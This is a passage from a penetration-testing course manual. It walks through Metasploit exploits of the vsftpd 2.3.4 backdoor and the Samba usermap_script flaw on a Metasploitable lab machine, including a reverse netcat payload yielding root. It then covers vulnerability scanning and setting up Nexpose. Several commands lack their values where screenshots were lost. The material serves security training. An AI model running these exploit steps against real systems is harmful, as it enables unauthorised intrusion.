S_E_Oblako
Exercise 23: Exploit Ftp vulnerability
1. Start Kali Linux machine
2. Start Metasploitable Linux Machine and check its IP address
3. From Kali machine run Zenmap against the IP address of the
Metasploitable machine to check vulnerability.
4. Google vsftpd 2.3.4 to see if there are any backdoors of this process
and if there is exploit to use that backdoor
5. Output shows that there is backdoor
S_E_Oblako
6. Copy the name of the Module that can open the back door
7. Go to Kali Linux terminal and type
8. #msfconsole to start the Metasploit
S_E_Oblako
msf>search vsftpd
9. Type: msf> use exploit/unix/ftp/vsftpd_234_backdoor
S_E_Oblako
10. After starting the exploit module type > show options
11. From the option command we can see that there are two options,
one is the RHOST (Remote Host) and RPORT ( Remote Port) so
we are going to connect to the machine using the RHOST by giving
the exploit the IP address of the target machine
12. Input the IP address of target machine > set RHOST 10.0.2.8
S_E_Oblako
13. Start the exploit by typing > exploit
14. As you can see from the above screen shot, we have a root access to
the target machine, we can do anything we want in that machine.
4.3. Code Execution vulnerabilities
So far, we have seen access through, default passwords, services
misconfiguration, and backdoors.
In this section we are going to see how to access a machine using
S_E_Oblako
vulnerabilities that exist in a certain service through command execution that
will give us full access to the target machine. We are going to use reverse
connection, i.e. we are going to setup the target machine to connect to our
attack machine using the port we chose, this way we can work around
firewalls. (normally firewalls set to refuse any connection from external to
internal but allow connection from internal to external.
Exercise 24: Exploiting Code Execution Vulnerability
1. Start zenmap in Kali Linux machine to find vulnerability
2. Google for Samba service 3.x in port 139 to see its vulnerability
3. Take the result from Rapid7 website (Rapid 7 is the same company
that developed the Metasploit framework)
S_E_Oblako
S_E_Oblako
4. Start Metasploit by typing #msfconsole
5. At the msf console type > use exploit/multi/samba/usermap_script
6. after the exploit start, type #show options
Note
Using the exploits and running them is always the same, even if you
get new exploit by following these steps you can run any exploits,
just remember to check the options of the exploits and what they can
allow you to do in the target machine.
S_E_Oblako
7. Setup the RHOST with the target machine using command
>set RHOST 10.0.2.8
8. Inject a payload into the target machine to exploit flaw in the
S_E_Oblako
Samba program.
Samba is a file and print services for all clients using
the SMB/CIFS protocol, such as all versions of DOS
and Windows, OS/2, Linux, and many others. Samba
is an important component to seamlessly integrate
Linux/Unix Servers and Desktops into Active
Directory environments). It can function both as a
domain controller or as a regular domain member.
Samba version that running in the Metasploitable
machine has a vulnerability of buffer overflow that
allow adversaries to run small code inside it, we need
to create a PAYLOAD and run it in the target
computer, the Payload will let us run Linux commands
in the target machine.
9. To see the different type of payloads type >show payloads
10. Notice that there are bind payloads and there are reverse payloads
Payloads: are small paces of code that will be executed inside the target
machine once the vulnerability exploited.
S_E_Oblako
11. We are going to use reverse payload to bypass the firewall in the
target network.
The reverse payload is that the victim machine initiates the connection
to the attack machine (Kali Linux).
12. Use msfconsole in kali to setup the port and IP address of Kali
machine that the victim should make the connection to.
Type
>set PAYLOAD cmd/unix/reverse_netcat
>show options
13. The LHOST is the attacker machine IP address (Kali ), the LPORT
is to setup the port
14. Check Kali machine IP address
S_E_Oblako
15. Set LHOST and LPORT
>set LHOST 
>set LPORT 
>set RHOST exploit
S_E_Oblako
Now the Target machine is connected to my machine on port 80 and I have
access as root (as you can see from the id and uname -a commands) this mean
I have a full access to the target machine.
S_E_Oblako
5.
Vulnerability Management
Vulnerability scanning is an organized approach to the testing,
identification, analysis and reporting of potential security issues on
a network. I.T. department must run vulnerability scans on a
weekly basis in order to be save from any new issues that might
appear in OS, Applications and networks. There are many tools to
do Vulnerability scanning such as Nessus, Qualys, Rapid7 Nexpuse
and more. In this section we are going to install and run Nexpuse
vulnerability scanning tool.
S_E_Oblako
5. Vulnerability Scanning
Vulnerability scanning is an inspection of the potential points of exploit on a
computer or network to identify security holes.
A vulnerability scan detects and classifies system weaknesses in computers,
networks and communications equipment and predicts the effectiveness of
countermeasures. A scan may be performed by the organization IT
department or by a security service provider, possibly as a condition imposed
by some authority. Vulnerability scans are also used by attackers looking for
points of entry.
A vulnerability scanner runs from the end point of the person inspecting the
attack surface in question. The software compares details about the target
attack surface to a database of information about known security holes in
services and ports, anomalies in packet construction, and potential paths to
exploitable programs or scripts. The scanner software attempts to exploit
each vulnerability that is discovered.
Running a vulnerability scan can pose its own risks as it is inherently
intrusive on the target machine’s running code. As a result, the scan can
cause issues such as errors and reboots, reducing productivity.
There are two approaches to vulnerability scanning, authenticated and
unauthenticated scans. In the unauthenticated method, the tester performs the
scan as an intruder would, without trusted access to the network. Such a scan
reveals vulnerabilities that can be accessed without logging into the network.
In an authenticated scan, the tester login as a network user, revealing the
vulnerabilities that are accessible to a trusted user, or an intruder that has
gained access as a trusted user.
5.1.Basic Vulnerability detection methods
Vulnerability detection method start by vulnerability scanning software read
the target banner or application version or checking a protocol version that
the target system is using. Then the vulnerability scanning software checks
the vulnerability databases, by looking at these databases the vulnerability
scanning software can know if there is a weakness in that application, Service
or OS.
Protocols that applications uses in communications with client may have
vulnerability also, for example a week encryption method in communication
protocol can be exploited easily, The vulnerability scanner can send different
packets in the network to examines the behavior of the service against these
S_E_Oblako
packets and examines whither the behavior is similar to the behavior of
vulnerable services.
Wrong configurations may cause weaknesses for example if you configure
your web authentication mechanism to allow three-character password, it can
very easily crack by attackers.
5.2.Vulnerability Scanning software
Vulnerability Scanner is a software designed to assess computers systems,
networks, and applications for known weaknesses. These scanner is used to
discover the weak points or poorly constructed parts, utilized for the
identification and detection of vulnerabilities related to mis-configured assets
or faulty software that reside in a network based asset such as firewall, router,
web server, application server, etc.
There are many vulnerability scanning software, here is a list of will-known
vulnerability scanning software:
Nmap NSE: Nmap is port scanning software but with the help of
Nmap Scripting Engine NSE it is possible to use Nmap as a
vulnerability scanner.
Nessus: Nessus is a vulnerability assessment software developed by
Tenable Network security is one of the most popular and capable
vulnerability scanners. Nessus Professional is the commercial
product in addition a free Nessus community version is also
available, but it is limited and can only licenses for home networks.
Nessus allow scan for:
Patch test without using agents.
Detecting misconfiguration.
Port scan.
Service detection.
Trying for known credentials.
Ability to use exploit.
Ability to look for credentials.
70,000+ plugins.
Reporting.
Microsoft MBSA: Microsoft Baseline security Analyzer provide a
S_E_Oblako
streamline method to identify missing security updates and common
security misconfigurations. MBSA is only for Microsoft systems
and it is not an overall vulnerability scanner at all.
Nexpose: is a commercial tool developed by Rapid7 the producers
of Metasploit framework, it is vulnerability scanner which aimed to
support the entire Vulnerability assessment process lifecycle
including discovery, detection, verification, risk classification,
impact analysis , Reporting and mitigation.
OpenVas: is open Source vulnerability scanner that was forked
from the last free version of Nessus after that tool went proprietary
in 2005.
SAINT: Commercial Vulnerability assessment tool like Nessus
used to be free and open source but is now a commercial product.
SAINT runs only in Linux and Mac OS and it don’t support or run
on Windows.
GFI LanGuard: is a network security and vulnerability Scanner
designed to help with Patch Management.
QualysGuard: is a popular code based SAAS (software as a
Service) vulnerability management, its web-based UI offers network
discovery and mapping assists prioritization vulnerability
assessment reporting and remediation tracking according to
business risks.
5.3.Vulnerability Database
A vulnerability database is a platform aimed at collecting, maintaining, and
disseminating information about discovered vulnerabilities targeting
computer systems. The database will customarily describe the identified
vulnerability, assess the potential impact on affected systems, and any
workarounds or updates to mitigate the issue. For a hacker to surmount a
system's information assurance, three elements must apply: a vulnerability
within the system, access to the vulnerability, and the ability to exploit the
vulnerability. Here the most known vulnerability databases:
Open Source Vulnerability Database (OSVDB) (
http://osvdb.org)
S_E_Oblako
The Open Source Vulnerability Database provides an accurate,
technical, and unbiased index on vulnerability security. The
comprehensive database cataloged over 121,000 vulnerabilities
spanning a 113-year period. The OSVDB was founded in August 2002
and was launched in March 2004. In its primitive beginning, newly
identified vulnerabilities were investigated by site members and
explanations were detailed on the website. However, as the necessity for
the service thrived, the need for dedicated staff resulted in the inception
of the Open Security Foundation (OSF) and the OSVDB was shut down
in April 2016; a paid service VulnDB took their place.
NIST National Vulnerability Database ( https://nvd.nist.gov/)
US government repository of standards-based vulnerability management
data represented using the Security Content Automation Protocol
(SCAP). This data enables automation of vulnerability management,
security measurement, and compliance. The NVD includes databases of
security checklist references, security related software flaws,
misconfigurations, product names, and impact metrics.
CVE Common Vulnerabilities and Exposures Details
(https://www.cvedetails.com/) The Common Vulnerabilities and
Exposures (CVE) system provides a reference-method for publicly
known information-security vulnerabilities and exposures. The
National Cybersecurity FFRDC, operated by the Mitre Corporation,
maintains the system, with funding from the National Cyber
Security Division of the United States Department of Homeland
Security. The Security Content Automation Protocol uses CVE, and
CVE IDs are listed on MITRE's system as well as in the US
National Vulnerability Database.
5.4. Vulnerability Management with Nexpose
Rapid7 Nexpose is a vulnerability scanner which aims to support the
entire vulnerability management lifecycle, including discovery,
detection, verification, risk classification, impact analysis, reporting and
mitigation. It integrates with Rapid7's Metasploit for vulnerability
S_E_Oblako
exploitation. It is sold as standalone software, an appliance, virtual
machine, or as a managed service or private cloud deployment. User
interaction is through a web browser. There is a free limited community
edition of Nexpose, as well as commercial versions.
S_E_Oblako
Exercise 25: Vulnerability Management – installing Nexpose
Note
Nexpose is a server software that need minimum 8G RAM and more than
100 G disk space and it might not work in virtual machine if you do not have
enough memory and disk space for Kali.
From Kali machine
Download Nexpose Free Community from the following Link:
https://www.rapid7.com/info/nexpose-community/
Fill the information to get one-year free license key via email.
Download Linux version as we are going to use in kali Linux.
Stop Postgresql database in Kali Linux because Nexpose come with
its own postgresql database and it will conflict with Kali Linux
database
#service postgresql stop
S_E_Oblako
change the Nexpose downloaded file to executable file.
run file
# ./Rapid7setup-Linux64.bin
follow the GUI installer.
Choose “ Security Console with local Scan Engine”.
Enter username and password to be used to access Nexpose
(root/password)
S_E_Oblako
Do Not choose “ Initialize and start Nexpose after installation”
5.5. Starting and Configuration Nexpose
Go to Nexpose directory inside Kali
#cd /opt/rapid7/nexpose/nsc
start Nexpose
#./nsc.sh
S_E_Oblako
First time it will take about 30 minutes to start because it will update
its vulnerability database.
Open Firefox and go to Click on Advances
https://localhost:3780
Click on advanced then accept Risk
Login with the username and password you setup during Nexpose
S_E_Oblako
installation and then enter license number that you received from
Rapid7 via email.
Note
If you choose to start Nexpose service automatically during the installation
that could cause Nexspose to fail to start, if you face that scenario do the
following:
- Stop Nexpose Service (see command in the above screen capture)
- Disable Nexpose from starting automatically
- Start Nexpose service
- Restart Kali Machine
- Start Nexpose
S_E_Oblako
Exercise 26: Running Nexpose
1. Start Metasploitable machine from Virtual Box and check its IP
address
S_E_Oblako
2. In Nexpose configuration GUI, create a site, give the site Name and
description
S_E_Oblako
3. Click on Sites and add the IP address of the machines that you need
to scan them
4. Click Save
5. Click one Site Name
6. Click Scan Now and give the scan a Name then start the scan
7. The scan will take at least 15 minutes to finish
S_E_Oblako
8. To see the details about the found vulnerabilities, click on the
machine name
9. click on the vulnerability to see detailed information
S_E_Oblako
5.6. Nexpose Reports Analysis
You may want any number of people in your organization to view asset and
vulnerability data without logging on to the Security Console. For example, a
chief information security officer (CISO) may need to see statistics about
S_E_Oblako
your overall risk trends over time. Or members of your security team may
need to see the most critical vulnerabilities for sensitive assets so that they
can prioritize remediation projects. It may be unnecessary or undesirable for
these stakeholders to access the application itself. By generating reports, you
can distribute critical information to the people who need it via e-mail or
integration of exported formats such as XML, CSV, or database formats.
Reports provide many, varied ways to look at scan data, from business-
centric perspectives to detailed technical assessments. You can learn
everything you need to know about vulnerabilities and how to remediate
them, or you can just list the services are running on your network assets.
You can create a report on a site, but reports are not tied to sites. You can
parse assets in a report any number of ways, including all your scanned
enterprise assets, or just one.
Exercise 27: Nexpose Analysis and Report Generating
After finish scanning, you can create a PDF report from the system, in this
exercise we are going to generate summarize report that include
recommendation of what you need to be done regarding discovered
vulnerabilities
To create a professional PDF report for the scanning:
Click on the Report icon on the right left side of the screen
Give Name to the report
Choose the report type:
Audit Report: detailed report about each vulnerability.
Executive Report: Summarized Report
Newly discovered Assets: if you scanning a complete
subnet it will show discovered devices
Top 10 vulnerabilities Report
Choose the scan
Run the report
S_E_Oblako
S_E_Oblako
To reset Nexpose Password :
#screen –x nexpose
➢ Reset password   
➢ Unlock account 
S_E_Oblako
5.7. Other Nexpose functions
Discovered Devices
Discovered Vulnerabilities
S_E_Oblako
6
Gaining Access (Client-Side Attacks)
Client site attack differ from Server side attack because it need the
end user interaction by downloading and running a malware that
will create a back door inside the client machine or gather
information from the client machine and send it to the hacker
machine. this kind of attacks need a lot of information gathering